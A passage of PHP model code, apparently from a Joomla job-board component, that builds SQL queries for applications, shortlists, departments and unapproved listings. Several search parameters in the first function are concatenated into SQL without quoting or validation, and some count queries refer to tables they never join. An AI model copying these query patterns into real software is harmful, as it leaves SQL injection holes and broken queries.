        $total = $db->loadResult();
        if ($total <= $limitstart)
            $limitstart = 0;

        $query = "SELECT apply.comments,apply.id AS jobapplyid ,job.id,job.agefrom,job.ageto, cat.cat_title ,apply.apply_date, apply.resumeview, jobtype.title AS jobtypetitle,app.iamavailable
					, app.id AS appid, app.first_name, app.last_name, app.email_address, app.jobtype,app.gender
					, app.total_experience, app.jobsalaryrange,rating.id AS ratingid, rating.rating
					, app.address_city, app.address_county, app.address_state ,app.id as resumeid
					, country.name AS countryname,state.name AS statename
					,city.name AS cityname
					, salary.rangestart, salary.rangeend,education.title AS educationtitle
					, currency.symbol AS symbol
					,dcurrency.symbol AS dsymbol ,dsalary.rangestart AS drangestart, salary.rangeend AS drangeend  
					,app.institute1_study_area AS education
					,app.photo AS photo,app.application_title AS applicationtitle
					FROM `#__js_job_jobs` AS job
					JOIN `#__js_job_jobtypes` AS jobtype ON job.jobtype = jobtype.id
					JOIN `#__js_job_categories` AS cat ON job.jobcategory = cat.id
					JOIN `#__js_job_jobapply` AS apply  ON apply.jobid = job.id 
					JOIN `#__js_job_resume` AS app ON apply.cvid = app.id 
					LEFT JOIN  `#__js_job_resumerating` AS rating ON (app.id=rating.resumeid AND apply.jobid=rating.jobid)
					LEFT JOIN `#__js_job_heighesteducation` AS  education  ON app.heighestfinisheducation=education.id
					LEFT OUTER JOIN  `#__js_job_salaryrange` AS salary	ON	app.jobsalaryrange=salary.id
					LEFT OUTER JOIN  `#__js_job_salaryrange` AS dsalary ON app.desired_salary=dsalary.id 
					LEFT JOIN `#__js_job_cities` AS city ON app.address_city = city.id
					LEFT JOIN `#__js_job_countries` AS country ON city.countryid  = country.id
					LEFT JOIN `#__js_job_states` AS state ON city.stateid = state.id
					LEFT JOIN `#__js_job_currencies` AS currency ON currency.id = app.currencyid
					LEFT JOIN `#__js_job_currencies` AS dcurrency ON dcurrency.id = app.desired_salary 
					
			WHERE apply.jobid = " . $jobid;
			if($tab_action) $query.=" AND apply.action_status=".$tab_action;
			if(isset($needle_array['title']) AND $needle_array['title'] !='') $query.=" AND app.application_title LIKE '%".str_replace("'","",$db->Quote($needle_array['title']))."%'";
			if(isset($needle_array['name']) AND $needle_array['name'] !='') $query.=" AND LOWER(app.first_name) LIKE ".$db->Quote( '%'.$needle_array['name'].'%', false );
			if(isset($needle_array['nationality']) AND $needle_array['nationality'] != '') $query .= " AND app.nationality = ".$needle_array['nationality'];
			if(isset($needle_array['gender']) AND $needle_array['gender'] != '') $query .= " AND app.gender = ".$needle_array['gender'];
			if(isset($needle_array['jobtype']) AND $needle_array['jobtype'] != '') $query .= " AND app.jobtype = ".$needle_array['jobtype'];
			if(isset($needle_array['currency']) AND $needle_array['currency'] != '') $query .= " AND app.currencyid = ".$needle_array['currency'];
			if(isset($needle_array['jobsalaryrange']) AND $needle_array['jobsalaryrange'] != '') $query .= " AND app.jobsalaryrange = ".$needle_array['jobsalaryrange'];
			if(isset($needle_array['heighestfinisheducation']) AND $needle_array['heighestfinisheducation'] != '') $query .= " AND app.heighestfinisheducation = ".$needle_array['heighestfinisheducation'];
        if (isset($needle_array['iamavailable']) AND $needle_array['iamavailable'] != '') {
            $available = ($needle_array['iamavailable'] == "yes") ? 1 : 0;
            $query .= " AND app.iamavailable = " . $available;
        }
			if(isset($needle_array['jobcategory']) AND $needle_array['jobcategory'] != '') $query .= " AND app.job_category = ".$needle_array['jobcategory'];
			if(isset($needle_array['jobsubcategory']) AND $needle_array['jobsubcategory'] != '') $query .= " AND app.job_subcategory = ".$needle_array['jobsubcategory'];
			if(isset($needle_array['experience']) AND $needle_array['experience'] != '') $query .= " AND app.total_experience LIKE ".$db->Quote($needle_array['experience']);

        $query .= " ORDER BY apply.apply_date DESC";


        $db->setQuery($query, $limitstart, $limit);
        $this->_application = $db->loadObjectList();

        $result[0] = $this->_application;
        $result[1] = $total;
        return $result;
    }

    function getJobAppliedResumeSearchOption() {

        $gender = array(
            '0' => array('value' => '', 'text' => JText::_('JS_SEARCH_ALL')),
            '1' => array('value' => 1, 'text' => JText::_('JS_MALE')),
            '2' => array('value' => 2, 'text' => JText::_('JS_FEMALE')),);

        $nationality = $this->getCountries(JText::_('JS_SEARCH_ALL'));
        $job_type = $this->getJobType(JText::_('JS_SEARCH_ALL'));
        $heighesteducation = $this->getHeighestEducation(JText::_('JS_SEARCH_ALL'));
        $job_categories = $this->getCategories(JText::_('JS_SEARCH_ALL'));
        $job_subcategories = $this->getSubCategoriesforCombo($job_categories[1]['value'], JText::_('JS_SEARCH_ALL'), '');
        $job_salaryrange = $this->getJobSalaryRange(JText::_('JS_SEARCH_ALL'), '');
        $job_currency = $this->getCurrencyResumeApplied(JText::_('JS_SELECT'));

        $searchoptions['nationality'] = JHTML::_('select.genericList', $nationality, 'nationality', 'class="inputbox" ' . '', 'value', 'text', '');
        $searchoptions['jobcategory'] = JHTML::_('select.genericList', $job_categories, 'jobcategory', 'class="inputbox" ' . 'onChange="fj_getsubcategories(\'fj_subcategory\', this.value)"', 'value', 'text', '');
        $searchoptions['jobsubcategory'] = JHTML::_('select.genericList', $job_subcategories, 'jobsubcategory', 'class="inputbox" ' . '', 'value', 'text', '');
        $searchoptions['jobsalaryrange'] = JHTML::_('select.genericList', $job_salaryrange, 'jobsalaryrange', 'class="inputbox" ' . '', 'value', 'text', '');
        $searchoptions['jobtype'] = JHTML::_('select.genericList', $job_type, 'jobtype', 'class="inputbox" ' . '', 'value', 'text', '');
        $searchoptions['heighestfinisheducation'] = JHTML::_('select.genericList', $heighesteducation, 'heighestfinisheducation', 'class="inputbox" ' . '', 'value', 'text', '');
        $searchoptions['gender'] = JHTML::_('select.genericList', $gender, 'gender', 'class="inputbox" ' . '', 'value', 'text', '');
        $searchoptions['currency'] = JHTML::_('select.genericList', $job_currency, 'currency', 'class="inputbox" ' . '', 'value', 'text', '');
        $result = array();
        $result[0] = $searchoptions;
        return $result;
    }

    function & getFolderResume($folderid, $searchname, $searchjobtype, $limitstart, $limit) {
        if (is_numeric($folderid) == false)
            return false;
        if ($searchjobtype)
            if (is_numeric($searchjobtype) == false)
                return false;
        $db = & JFactory :: getDBO();
        $result = array();

        $query = "SELECT COUNT(foldres.id) FROM `#__js_job_folderresumes` AS foldres 	WHERE  foldres.folderid = " . $folderid;

        if ($searchname) {
            $query .= " AND (";
            $query .= " LOWER(app.first_name) LIKE " . $db->Quote('%' . $searchname . '%', false);
            $query .= " OR LOWER(app.last_name) LIKE " . $db->Quote('%' . $searchname . '%', false);
            $query .= " OR LOWER(app.middle_name) LIKE " . $db->Quote('%' . $searchname . '%', false);
            $query .= " )";
        }
        if ($searchjobtype)
            $query .= " AND app.jobtype = " . $searchjobtype;

        $db->setQuery($query);
        $total = $db->loadResult();
        if ($total <= $limitstart)
            $limitstart = 0;

        $query = "SELECT  apply.comments,apply.id,apply.jobid,cat.cat_title ,apply.apply_date, jobtype.title AS jobtypetitle
                        , app.id AS appid, app.first_name, app.last_name, app.email_address, app.jobtype,app.gender
                        ,app.total_experience, app.jobsalaryrange, salary.rangestart, salary.rangeend, rating.rating,rating.id AS ratingid
                        ,app.address_city, app.address_county, app.address_state
                        ,country.name AS countryname,state.name AS statename
                        ,city.name AS cityname,currency.symbol

                        FROM `#__js_job_resume` AS app
                        JOIN `#__js_job_jobtypes` AS jobtype ON app.jobtype = jobtype.id
                        JOIN `#__js_job_categories` AS cat ON app.job_category = cat.id
                        JOIN `#__js_job_jobapply` AS apply  ON apply.cvid = app.id
						LEFT JOIN  `#__js_job_resumerating` AS rating ON (app.id=rating.resumeid AND apply.jobid=rating.jobid)
                        LEFT JOIN  `#__js_job_salaryrange` AS salary ON app.jobsalaryrange=salary.id
						LEFT JOIN `#__js_job_currencies` AS currency ON currency.id = app.currencyid 	 		
                        LEFT JOIN  `#__js_job_folderresumes` AS fres ON (app.id=fres.resumeid AND apply.jobid=fres.jobid)
                        LEFT JOIN `#__js_job_countries` AS country ON app.address_country  = country.id
                        LEFT JOIN `#__js_job_states` AS state ON app.address_state = state.id
                        LEFT JOIN `#__js_job_cities` AS city ON app.address_city = city.id
		WHERE fres.folderid = " . $folderid;
        if ($searchname) {
            $query .= " AND (";
            $query .= " LOWER(app.first_name) LIKE " . $db->Quote('%' . $searchname . '%', false);
            $query .= " OR LOWER(app.last_name) LIKE " . $db->Quote('%' . $searchname . '%', false);
            $query .= " OR LOWER(app.middle_name) LIKE " . $db->Quote('%' . $searchname . '%', false);
            $query .= " )";
        }
        if ($searchjobtype)
            $query .= " AND app.jobtype = " . $searchjobtype;

        $query .= " ORDER BY apply.apply_date DESC";

        $db->setQuery($query, $limitstart, $limit);
        $this->_application = $db->loadObjectList();

        $lists = array();

        $job_type = $this->getJobType(JText::_('JS_SELECT_JOB_TYPE'));

        if ($searchname)
            $lists['searchname'] = $searchname;
        if ($searchjobtype)
            $lists['jobtype'] = JHTML::_('select.genericList', $job_type, 'searchjobtype', 'class="inputbox" ' . 'onChange="document.adminForm.submit();"', 'value', 'text', $searchjobtype);
        else
            $lists['jobtype'] = JHTML::_('select.genericList', $job_type, 'searchjobtype', 'class="inputbox" ' . 'onChange="document.adminForm.submit();"', 'value', 'text', '');

        $result[0] = $this->_application;
        $result[1] = $total;
        $result[2] = $lists;
        return $result;
    }

    function & getShortListCandidates($jobid, $searchname, $searchjobtype, $limitstart, $limit) {
        if (is_numeric($jobid) == false)
            return false;
        if ($searchjobtype)
            if (is_numeric($searchjobtype) == false)
                return false;
        $db = & JFactory :: getDBO();
        $result = array();

        $query = "SELECT COUNT(shortlist.id) FROM `#__js_job_shortlistcandidates` AS shortlist WHERE  shortlist.jobid = " . $jobid;

        if ($searchname) {
            $query .= " AND (";
            $query .= " LOWER(app.first_name) LIKE " . $db->Quote('%' . $searchname . '%', false);
            $query .= " OR LOWER(app.last_name) LIKE " . $db->Quote('%' . $searchname . '%', false);
            $query .= " OR LOWER(app.middle_name) LIKE " . $db->Quote('%' . $searchname . '%', false);
            $query .= " )";
        }
        if ($searchjobtype)
            $query .= " AND app.jobtype = " . $searchjobtype;


        $db->setQuery($query);
        $total = $db->loadResult();
        if ($total <= $limitstart)
            $limitstart = 0;

        $query = "SELECT cat.cat_title ,apply.apply_date, jobtype.title AS jobtypetitle
				, app.id AS appid, app.first_name, app.last_name, app.email_address, app.jobtype
				, app.jobsalaryrange, salary.rangestart, salary.rangeend
				FROM `#__js_job_resume` AS app
				JOIN `#__js_job_jobtypes` AS jobtype ON app.jobtype = jobtype.id
				JOIN `#__js_job_categories` AS cat ON app.job_category = cat.id
				JOIN `#__js_job_shortlistcandidates` AS shortlist ON shortlist.cvid = app.id
				LEFT OUTER JOIN  `#__js_job_salaryrange` AS salary	ON	app.jobsalaryrange=salary.id
		WHERE shortlist.jobid = " . $jobid;

        if ($searchname) {
            $query .= " AND (";
            $query .= " LOWER(app.first_name) LIKE " . $db->Quote('%' . $searchname . '%', false);
            $query .= " OR LOWER(app.last_name) LIKE " . $db->Quote('%' . $searchname . '%', false);
            $query .= " OR LOWER(app.middle_name) LIKE " . $db->Quote('%' . $searchname . '%', false);
            $query .= " )";
        }
        if ($searchjobtype)
            $query .= " AND app.jobtype = " . $searchjobtype;

        $query .= " ORDER BY apply.apply_date DESC";


        $db->setQuery($query, $limitstart, $limit);
        $this->_application = $db->loadObjectList();

        $lists = array();

        $job_type = $this->getJobType(JText::_('JS_SELECT_JOB_TYPE'));

        if ($searchname)
            $lists['searchname'] = $searchname;
        if ($searchjobtype)
            $lists['jobtype'] = JHTML::_('select.genericList', $job_type, 'searchjobtype', 'class="inputbox" ' . 'onChange="document.adminForm.submit();"', 'value', 'text', $searchjobtype);
        else
            $lists['jobtype'] = JHTML::_('select.genericList', $job_type, 'searchjobtype', 'class="inputbox" ' . 'onChange="document.adminForm.submit();"', 'value', 'text', '');


        $result[0] = $this->_application;
        $result[1] = $total;

        $result[2] = $lists;
        return $result;
    }

    function & getCompanyDepartments($companyid, $searchcompany, $searchdepartment, $limitstart, $limit) {
        if (is_numeric($companyid) == false)
            return false;
        $db = & JFactory :: getDBO();
        $result = array();
        $lists = array();

        $query = "SELECT COUNT(department.id)
			FROM `#__js_job_departments` AS department
			JOIN `#__js_job_companies` AS company ON company.id = department.companyid
			WHERE department.companyid =" . $companyid;
        if ($searchcompany)
            $query .= " AND LOWER(company.name) LIKE " . $db->Quote('%' . $searchcompany . '%', false);
        if ($searchdepartment)
            $query .= " AND LOWER(department.name) LIKE " . $db->Quote('%' . $searchdepartment . '%', false);

        $db->setQuery($query);
        $total = $db->loadResult();
        if ($total <= $limitstart)
            $limitstart = 0;

        $query = "SELECT department.*, company.name as companyname
			FROM `#__js_job_departments` AS department
			JOIN `#__js_job_companies` AS company ON company.id = department.companyid
			WHERE department.companyid =" . $companyid;
        if ($searchcompany)
            $query .= " AND LOWER(company.name) LIKE " . $db->Quote('%' . $searchcompany . '%', false);
        if ($searchdepartment)
            $query .= " AND LOWER(department.name) LIKE " . $db->Quote('%' . $searchdepartment . '%', false);

        $db->setQuery($query, $limitstart, $limit);
        $departments = $db->loadObjectList();
        if ($searchcompany)
            $lists['searchcompany'] = $searchcompany;
        if ($searchdepartment)
            $lists['searchdepartment'] = $searchdepartment;

        $result[0] = $departments;
        $result[1] = $total;
        if (isset($lists))
            $result[2] = $lists;

        return $result;
    }

    function & getDepartments($searchcompany, $searchdepartment, $limitstart, $limit) {
        $db = & JFactory :: getDBO();
        $result = array();
        $query = "SELECT COUNT(department.id)
			FROM `#__js_job_departments` AS department
			JOIN `#__js_job_companies` AS company ON company.id = department.companyid
			WHERE department.status <> 0";
        if ($searchcompany)
            $query .= " AND LOWER(company.name) LIKE " . $db->Quote('%' . $searchcompany . '%', false);
        if ($searchdepartment)
            $query .= " AND LOWER(department.name) LIKE " . $db->Quote('%' . $searchdepartment . '%', false);

        $db->setQuery($query);
        $total = $db->loadResult();
        if ($total <= $limitstart)
            $limitstart = 0;

        $query = "SELECT department.*, company.name as companyname
			FROM `#__js_job_departments` AS department
			JOIN `#__js_job_companies` AS company ON company.id = department.companyid
			WHERE department.status <> 0";
        if ($searchcompany)
            $query .= " AND LOWER(company.name) LIKE " . $db->Quote('%' . $searchcompany . '%', false);
        if ($searchdepartment)
            $query .= " AND LOWER(department.name) LIKE " . $db->Quote('%' . $searchdepartment . '%', false);

        $db->setQuery($query, $limitstart, $limit);
        $departments = $db->loadObjectList();
        $lists = "";
        if ($searchcompany)
            $lists['searchcompany'] = $searchcompany;
        if ($searchdepartment)
            $lists['searchdepartment'] = $searchdepartment;

        $result[0] = $departments;
        $result[1] = $total;
        $result[2] = $lists;
        return $result;
    }

    function & getAllUnapprovedDepartments($searchcompany, $searchdepartment, $limitstart, $limit) {
        $db = & JFactory :: getDBO();
        $result = array();
        $query = "SELECT COUNT(department.id)
			FROM `#__js_job_departments` AS department
			JOIN `#__js_job_companies` AS company ON company.id = department.companyid
			WHERE department.status = 0";
        if ($searchcompany)
            $query .= " AND LOWER(company.name) LIKE " . $db->Quote('%' . $searchcompany . '%', false);
        if ($searchdepartment)
            $query .= " AND LOWER(department.name) LIKE " . $db->Quote('%' . $searchdepartment . '%', false);

        $db->setQuery($query);
        $total = $db->loadResult();

        if ($total <= $limitstart)
            $limitstart = 0;

        $query = "SELECT department.*, company.name as companyname
			FROM `#__js_job_departments` AS department
			JOIN `#__js_job_companies` AS company ON company.id = department.companyid
			WHERE department.status = 0";
        if ($searchcompany)
            $query .= " AND LOWER(company.name) LIKE " . $db->Quote('%' . $searchcompany . '%', false);
        if ($searchdepartment)
            $query .= " AND LOWER(department.name) LIKE " . $db->Quote('%' . $searchdepartment . '%', false);

        $db->setQuery($query, $limitstart, $limit);
        $departments = $db->loadObjectList();
        $lists = "";

        if ($searchcompany)
            $lists['searchcompany'] = $searchcompany;
        if ($searchdepartment)
            $lists['searchdepartment'] = $searchdepartment;

        $result[0] = $departments;
        $result[1] = $total;
        $result[2] = $lists;
        return $result;
    }

    function & getAllEmpApps($searchtitle, $searchname, $searchjobcategory, $searchjobtype, $searchjobsalaryrange, $limitstart, $limit) {
        if ($searchjobcategory)
            if (is_numeric($searchjobcategory) == false)
                return false;
        if ($searchjobtype)
            if (is_numeric($searchjobtype) == false)
                return false;
        if ($searchjobsalaryrange)
            if (is_numeric($searchjobsalaryrange) == false)
                return false;
        $db = & JFactory :: getDBO();
        $result = array();
        $query = "SELECT COUNT(id) FROM #__js_job_resume AS app WHERE app.status <> 0";
        if ($searchtitle)
            $query .= " AND LOWER(app.application_title) LIKE " . $db->Quote('%' . $searchtitle . '%', false);
        if ($searchname) {
            $query .= " AND (";
            $query .= " LOWER(app.first_name) LIKE " . $db->Quote('%' . $searchname . '%', false);
            $query .= " OR LOWER(app.last_name) LIKE " . $db->Quote('%' . $searchname . '%', false);
            $query .= " OR LOWER(app.middle_name) LIKE " . $db->Quote('%' . $searchname . '%', false);
            $query .= " )";
        }
        if ($searchjobcategory)
            $query .= " AND app.job_category = " . $searchjobcategory;
        if ($searchjobtype)
            $query .= " AND app.jobtype = " . $searchjobtype;
        if ($searchjobsalaryrange)
            $query .= " AND app.jobsalaryrange = " . $searchjobsalaryrange;
        $db->setQuery($query);
        $total = $db->loadResult();
        if ($total <= $limitstart)
            $limitstart = 0;

        $query = "SELECT app.id, app.application_title,app.first_name, app.last_name, app.jobtype,
				app.jobsalaryrange, app.create_date, app.status, cat.cat_title, salary.rangestart, salary.rangeend , currency.symbol
				, jobtype.title AS jobtypetitle,app.isgoldresume,app.isfeaturedresume
			FROM #__js_job_resume AS app 
			JOIN #__js_job_categories AS cat ON app.job_category = cat.id
                        JOIN #__js_job_jobtypes AS jobtype	ON app.jobtype = jobtype.id
                        LEFT JOIN #__js_job_salaryrange AS salary ON app.jobsalaryrange = salary.id
			LEFT JOIN #__js_job_currencies AS currency ON currency.id = app.currencyid
										
				WHERE app.status <> 0  ";

        if ($searchtitle)
            $query .= " AND LOWER(app.application_title) LIKE " . $db->Quote('%' . $searchtitle . '%', false);
        if ($searchname) {
            $query .= " AND (";
            $query .= " LOWER(app.first_name) LIKE " . $db->Quote('%' . $searchname . '%', false);
            $query .= " OR LOWER(app.last_name) LIKE " . $db->Quote('%' . $searchname . '%', false);
            $query .= " OR LOWER(app.middle_name) LIKE " . $db->Quote('%' . $searchname . '%', false);
            $query .= " )";
        }
        if ($searchjobcategory)
            $query .= " AND app.job_category = " . $searchjobcategory;
        if ($searchjobtype)
            $query .= " AND app.jobtype = " . $searchjobtype;
        if ($searchjobsalaryrange)
            $query .= " AND app.jobsalaryrange = " . $searchjobsalaryrange;

        $query .= " ORDER BY app.create_date DESC";

        $db->setQuery($query, $limitstart, $limit);
        $this->_application = $db->loadObjectList();

        $lists = array();

        $job_type = array(
            '0' => array('value' => '', 'text' => JText::_('JS_SELECT_JOB_TYPE')),
            '1' => array('value' => JText::_(1), 'text' => JText::_('JS_JOBTYPE_FULLTIME')),
            '2' => array('value' => JText::_(2), 'text' => JText::_('JS_JOBTYPE_PARTTIME')),
            '3' => array('value' => JText::_(3), 'text' => JText::_('JS_JOBTYPE_INTERNSHIP')),);


        $job_categories = $this->getCategories(JText::_('JS_SELECT_JOB_CATEGORY'), '');
        $job_salaryrange = $this->getJobSalaryRange(JText::_('JS_SELECT_SALARY_RANGE'), '');

        if ($searchtitle)
            $lists['searchtitle'] = $searchtitle;
        if ($searchname)
            $lists['searchname'] = $searchname;
        if ($searchjobcategory)
            $lists['jobcategory'] = JHTML::_('select.genericList', $job_categories, 'searchjobcategory', 'class="inputbox" ' . 'onChange="this.form.submit();"' . 'style="width:115px"', 'value', 'text', $searchjobcategory);
        else
            $lists['jobcategory'] = JHTML::_('select.genericList', $job_categories, 'searchjobcategory', 'class="inputbox" ' . 'onChange="this.form.submit();"' . 'style="width:115px"', 'value', 'text', '');
        if ($searchjobtype)
            $lists['jobtype'] = JHTML::_('select.genericList', $job_type, 'searchjobtype', 'class="inputbox" ' . 'onChange="document.adminForm.submit();"', 'value', 'text', $searchjobtype);
        else
            $lists['jobtype'] = JHTML::_('select.genericList', $job_type, 'searchjobtype', 'class="inputbox" ' . 'onChange="document.adminForm.submit();"', 'value', 'text', '');
        if ($searchjobsalaryrange)
            $lists['jobsalaryrange'] = JHTML::_('select.genericList', $job_salaryrange, 'searchjobsalaryrange', 'class="inputbox" ' . 'onChange="document.adminForm.submit();"', 'value', 'text', $searchjobsalaryrange);
        else
            $lists['jobsalaryrange'] = JHTML::_('select.genericList', $job_salaryrange, 'searchjobsalaryrange', 'class="inputbox" ' . 'onChange="document.adminForm.submit();"', 'value', 'text', '');

        $result[0] = $this->_application;
        $result[1] = $total;
        $result[2] = $lists;
        return $result;
    }

    function & getAllUnapprovedJobs($searchtitle, $searchcompany, $searchjobcategory, $searchjobtype, $searchjobstatus, $limitstart, $limit) {
        if ($searchjobcategory)
            if (is_numeric($searchjobcategory) == false)
                return false;
        if ($searchjobtype)
            if (is_numeric($searchjobtype) == false)
                return false;
        if ($searchjobstatus)
            if (is_numeric($searchjobstatus) == false)
                return false;
        $db = & JFactory :: getDBO();
        $result = array();
        $query = "SELECT COUNT(job.id) FROM `#__js_job_jobs` AS job
					LEFT JOIN `#__js_job_companies` AS company ON job.companyid = company.id
					WHERE job.status = 0";
        if ($searchtitle)
            $query .= " AND LOWER(job.title) LIKE " . $db->Quote('%' . $searchtitle . '%', false);
        if ($searchcompany)
            $query .= " AND LOWER(company.name) LIKE " . $db->Quote('%' . $searchcompany . '%', false);
        if ($searchjobcategory)
            $query .= " AND job.jobcategory = " . $searchjobcategory;
        if ($searchjobtype)
            $query .= " AND job.jobtype = " . $searchjobtype;
        if ($searchjobstatus)
            $query .= " AND job.jobstatus = " . $searchjobstatus;

        $db->setQuery($query);
        $total = $db->loadResult();
        if ($total <= $limitstart)
            $limitstart = 0;

        $query = "SELECT job.*, cat.cat_title, jobtype.title AS jobtypetitle, jobstatus.title AS jobstatustitle, company.name AS companyname
				FROM `#__js_job_jobs` AS job
				JOIN `#__js_job_categories` AS cat ON job.jobcategory = cat.id
				JOIN `#__js_job_jobtypes` AS jobtype ON job.jobtype = jobtype.id
				JOIN `#__js_job_jobstatus` AS jobstatus ON job.jobstatus = jobstatus.id
				LEFT JOIN `#__js_job_companies` AS company ON job.companyid = company.id
				WHERE  job.status = 0 ";
        if ($searchtitle)
            $query .= " AND LOWER(job.title) LIKE " . $db->Quote('%' . $searchtitle . '%', false);
        if ($searchcompany)
            $query .= " AND LOWER(company.name) LIKE " . $db->Quote('%' . $searchcompany . '%', false);
        if ($searchjobcategory)
            $query .= " AND job.jobcategory = " . $searchjobcategory;
        if ($searchjobtype)
            $query .= " AND job.jobtype = " . $searchjobtype;
        if ($searchjobstatus)
            $query .= " AND job.jobstatus = " . $searchjobstatus;

        $query .= " ORDER BY job.created DESC";

        $db->setQuery($query, $limitstart, $limit);
        $this->_application = $db->loadObjectList();

        $lists = array();

        $job_type = $this->getJobType(JText::_('JS_SELECT_JOB_TYPE'));
        $jobstatus = $this->getJobStatus(JText::_('JS_SELECT_JOB_STATUS'));

        $job_categories = $this->getCategories(JText::_('JS_SELECT_JOB_CATEGORY'), '');
        if ($searchtitle)
            $lists['searchtitle'] = $searchtitle;
        if ($searchcompany)
            $lists['searchcompany'] = $searchcompany;
        if ($searchjobcategory)
            $lists['jobcategory'] = JHTML::_('select.genericList', $job_categories, 'searchjobcategory', 'class="inputbox" ' . 'onChange="this.form.submit();"' . 'style="width:115px"', 'value', 'text', $searchjobcategory);
        else
            $lists['jobcategory'] = JHTML::_('select.genericList', $job_categories, 'searchjobcategory', 'class="inputbox" ' . 'onChange="this.form.submit();"' . 'style="width:115px"', 'value', 'text', '');
        if ($searchjobtype)
            $lists['jobtype'] = JHTML::_('select.genericList', $job_type, 'searchjobtype', 'class="inputbox" ' . 'onChange="document.adminForm.submit();"', 'value', 'text', $searchjobtype);
        else
            $lists['jobtype'] = JHTML::_('select.genericList', $job_type, 'searchjobtype', 'class="inputbox" ' . 'onChange="document.adminForm.submit();"', 'value', 'text', '');
        if ($searchjobstatus)
            $lists['jobstatus'] = JHTML::_('select.genericList', $jobstatus, 'searchjobstatus', 'class="inputbox" ' . 'onChange="document.adminForm.submit();"' . 'style="width:115px"', 'value', 'text', $searchjobstatus);
        else
            $lists['jobstatus'] = JHTML::_('select.genericList', $jobstatus, 'searchjobstatus', 'class="inputbox" ' . 'onChange="document.adminForm.submit();"' . 'style="width:115px"', 'value', 'text', '');

        $result[0] = $this->_application;
        $result[1] = $total;
        $result[2] = $lists;
        return $result;
    }

    function & getAllUnapprovedEmpApps($searchtitle, $searchname, $searchjobcategory, $searchjobtype, $searchjobsalaryrange, $limitstart, $limit) {
        if ($searchjobcategory)
            if (is_numeric($searchjobcategory) == false)
                return false;
        if ($searchjobtype)
            if (is_numeric($searchjobtype) == false)
                return false;
        if ($searchjobsalaryrange)
            if (is_numeric($searchjobsalaryrange) == false)
                return false;
        $db = & JFactory :: getDBO();
        $result = array();
        $query = "SELECT COUNT(id) FROM #__js_job_resume AS app WHERE status = 0";
        if ($searchtitle)
            $query .= " AND LOWER(app.application_title) LIKE " . $db->Quote('%' . $searchtitle . '%', false);
        if ($searchname) {
            $query .= " AND (";
            $query .= " LOWER(app.first_name) LIKE " . $db->Quote('%' . $searchname . '%', false);
            $query .= " OR LOWER(app.last_name) LIKE " . $db->Quote('%' . $searchname . '%', false);
            $query .= " OR LOWER(app.middle_name) LIKE " . $db->Quote('%' . $searchname . '%', false);
            $query .= " )";
        }
        if ($searchjobcategory)
            $query .= " AND app.job_category = " . $searchjobcategory;
        if ($searchjobtype)
            $query .= " AND app.jobtype = " . $searchjobtype;
        if ($searchjobsalaryrange)
            $query .= " AND app.jobsalaryrange = " . $searchjobsalaryrange;
        $db->setQuery($query);
        $total = $db->loadResult();
        if ($total <= $limitstart)
            $limitstart = 0;

        $query = "SELECT app.id, app.application_title,app.first_name, app.last_name, app.jobtype,
				app.jobsalaryrange, app.create_date, cat.cat_title , salary.rangestart, salary.rangeend
				, jobtype.title AS jobtypetitle,currency.symbol
				FROM #__js_job_resume AS app , #__js_job_categories AS cat, #__js_job_salaryrange AS salary, #__js_job_jobtypes AS jobtype,#__js_job_currencies AS currency
				WHERE app.job_category = cat.id AND app.jobsalaryrange = salary.id AND app.jobtype= jobtype.id AND app.currencyid= currency.id AND app.status = 0 ";
        if ($searchtitle)
            $query .= " AND LOWER(app.application_title) LIKE " . $db->Quote('%' . $searchtitle . '%', false);
        if ($searchname) {
            $query .= " AND (";
            $query .= " LOWER(app.first_name) LIKE " . $db->Quote('%' . $searchname . '%', false);
            $query .= " OR LOWER(app.last_name) LIKE " . $db->Quote('%' . $searchname . '%', false);
            $query .= " OR LOWER(app.middle_name) LIKE " . $db->Quote('%' . $searchname . '%', false);
            $query .= " )";
        }
        if ($searchjobcategory)
            $query .= " AND app.job_category = " . $searchjobcategory;
        if ($searchjobtype)
            $query .= " AND app.jobtype = " . $searchjobtype;
        if ($searchjobsalaryrange)
            $query .= " AND app.jobsalaryrange = " . $searchjobsalaryrange;

        $query .= " ORDER BY app.create_date DESC";

        $db->setQuery($query, $limitstart, $limit);
        $this->_application = $db->loadObjectList();

        $lists = array();

        $job_type = array(
            '0' => array('value' => '', 'text' => JText::_('JS_SELECT_JOB_TYPE')),
            '1' => array('value' => JText::_(1), 'text' => JText::_('JS_JOBTYPE_FULLTIME')),
            '2' => array('value' => JText::_(2), 'text' => JText::_('JS_JOBTYPE_PARTTIME')),
            '3' => array('value' => JText::_(3), 'text' => JText::_('JS_JOBTYPE_INTERNSHIP')),);


        $job_categories = $this->getCategories(JText::_('JS_SELECT_JOB_CATEGORY'), '');
        $job_salaryrange = $this->getJobSalaryRange(JText::_('JS_SELECT_SALARY_RANGE'), '');

        if ($searchtitle)
            $lists['searchtitle'] = $searchtitle;
        if ($searchname)
            $lists['searchname'] = $searchname;
        if ($searchjobcategory)
            $lists['jobcategory'] = JHTML::_('select.genericList', $job_categories, 'searchjobcategory', 'class="inputbox" ' . 'onChange="this.form.submit();"' . 'style="width:115px"', 'value', 'text', $searchjobcategory);
        else
            $lists['jobcategory'] = JHTML::_('select.genericList', $job_categories, 'searchjobcategory', 'class="inputbox" ' . 'onChange="this.form.submit();"' . 'style="width:115px"', 'value', 'text', '');
        if ($searchjobtype)
            $lists['jobtype'] = JHTML::_('select.genericList', $job_type, 'searchjobtype', 'class="inputbox" ' . 'onChange="document.adminForm.submit();"', 'value', 'text', $searchjobtype);
        else
            $lists['jobtype'] = JHTML::_('select.genericList', $job_type, 'searchjobtype', 'class="inputbox" ' . 'onChange="document.adminForm.submit();"', 'value', 'text', '');
        if ($searchjobsalaryrange)
            $lists['jobsalaryrange'] = JHTML::_('select.genericList', $job_salaryrange, 'searchjobsalaryrange', 'class="inputbox" ' . 'onChange="document.adminForm.submit();"', 'value', 'text', $searchjobsalaryrange);
        else
            $lists['jobsalaryrange'] = JHTML::_('select.genericList', $job_salaryrange, 'searchjobsalaryrange', 'class="inputbox" ' . 'onChange="document.adminForm.submit();"', 'value', 'text', '');

        $result[0] = $this->_application;
        $result[1] = $total;
        $result[2] = $lists;
        return $result;
    }

    function & getAllMessages($statusoperator, $username, $usertype, $company, $jobtitle, $subject, $limitstart, $limit) {
        $db = & JFactory :: getDBO();
        $result = array();
        $userjoin = "";
        $jobjoin = "";
        $wherequery = "";
        $companyjoin = "";
        if ($username) {
            if ($usertype == 1)
                $userjoin = " JOIN #__users AS user ON user.id = message.employerid"; //employer
            elseif ($usertype == 2)
                $userjoin = " JOIN #__users AS user ON user.id = message.jobseekerid"; // jobseeker
        }

        if ($jobtitle) {
